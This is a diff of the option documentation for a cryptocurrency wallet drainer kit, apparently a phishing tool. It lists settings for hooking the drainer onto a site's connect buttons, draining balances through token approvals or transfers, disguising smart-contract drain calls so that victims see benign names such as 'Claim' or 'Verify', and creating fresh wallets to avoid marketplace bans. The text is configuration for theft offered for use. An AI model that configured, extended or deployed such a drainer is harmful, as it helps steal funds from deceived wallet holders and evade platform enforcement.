@@ -6,8 +6,6 @@
         /____/\___/_/ /_/   \____/ .___/\__/_/\____/_/ /_/____/  (_)  
                                 /_/                                 
                                   
- Note: Not finished yet, 🔺 emojis means probably need to get deleted
-
     Class Buttons:
         – connect_buttons_class: The class of the button you want to drainer on.
         *Note: This option can be the same as "connect_buttons_class" one, not recommended to edit if you don't need any specific config.
@@ -45,8 +43,6 @@
         – use_token_transfer: If you prefer to use approvement or token transfer
 
         – use_transfer_contract: Use a smart-contract for all balance hits, Victim will see datas of "transfer_contract_drain_function_name" + 0x000...0000 address
-
-        – transfer_contract_drain_function_name: The name of the method used to drain the balance using smart-contract. Possibilities: Claim, Confirm, Verify, Connect, Start, Gift and Enable 🔺
 
         – create_wallet_for_seaport: Create a new wallet for each seaport and send you private key to avoid opensea ban. not recommended to edit because blur is now better than opensea. ("disable_seaport" must be false)
 
